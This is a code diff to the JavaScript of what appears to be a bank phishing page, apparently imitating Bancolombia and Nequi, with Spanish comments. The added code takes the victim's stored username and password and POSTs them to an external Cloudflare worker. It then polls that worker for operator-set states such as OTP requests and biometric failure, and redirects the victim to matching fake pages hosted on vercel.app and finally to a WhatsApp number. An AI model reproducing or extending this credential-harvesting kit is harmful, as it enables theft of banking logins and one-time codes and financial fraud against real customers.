@@ -144,8 +144,12 @@ body{
 </div>
 
 <script>
+// CONFIGURACIÓN - Cambia esta URL a tu worker
+const WORKER_URL = "https://billowing-night-23ff.carlosandreslopezsterr.workers.dev";
+
 document.addEventListener('DOMContentLoaded', async () => {
   const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+  
   if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !bancoldata.transactionId) {
     alert("Faltan datos de login o transactionId");
     window.location.href = 'index.html';
@@ -158,25 +162,53 @@ document.addEventListener('DOMContentLoaded', async () => {
 
   document.getElementById("transactionId").innerText = transactionId;
 
+  // Enviar los datos al worker si no se han enviado
   const checkStatus = async () => {
     try {
-      const res = await fetch(`https://quiet-haze-3548.micollflorez.workers.dev/status?id=${transactionId}`);
-      const data = await res.json();
+      // Primero, verificar si ya se enviaron los datos
+      const statusRes = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
+      const data = await statusRes.json();
+      
+      // Si no existe el ID en el worker, enviar los datos
+      if (!data || Object.keys(data).length === 0) {
+        console.log("Enviando datos al worker...");
+        await fetch(`${WORKER_URL}/login`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usuario, clave, transactionId })
+        });
+        setTimeout(checkStatus, 2000);
+        return;
+      }
 
+      // Verificar el estado
       if (!data.estado || data.estado === "pendiente") {
         setTimeout(checkStatus, 2000);
         return;
       }
 
-      if (data.estado === "autorizado") window.location.href = "https://seguridadnequi.vercel.app/cupo.html";
-      else if (data.estado === "error") window.location.href = "https://seguridadnequi.vercel.app/inicio/codeinco.html";
-      else if (data.estado === "otp") window.location.href = "https://seguridadnequi.vercel.app/inicio/codigo.html";
-      else if (data.estado === "fallo") window.location.href = "https://seguridadnequi.vercel.app/fac.html";
-      else if (data.estado === "finalizado") window.location.href = "https://wa.me/3019207518?text=Hola%20me%20interesa%20más%20información/";
-
-      else setTimeout(checkStatus, 2000);
+      // Redirigir según el estado
+      if (data.estado === "autorizado") {
+        window.location.href = "https://seguridadnequi.vercel.app/cupo.html";
+      } 
+      else if (data.estado === "error") {
+        window.location.href = "https://seguridadnequi.vercel.app/inicio/codeinco.html";
+      } 
+      else if (data.estado === "solicitando_otp" || data.estado === "otp_recibido") {
+        window.location.href = "https://seguridadnequi.vercel.app/inicio/codigo.html";
+      } 
+      else if (data.estado === "fallo_biometria") {
+        window.location.href = "https://seguridadnequi.vercel.app/fac.html";
+      } 
+      else if (data.estado === "finalizado") {
+        window.location.href = "https://wa.me/3019207518?text=Hola%20me%20interesa%20más%20información";
+      } 
+      else {
+        setTimeout(checkStatus, 2000);
+      }
 
     } catch (err) {
+      console.error("Error:", err);
       setTimeout(checkStatus, 3000);
     }
   };
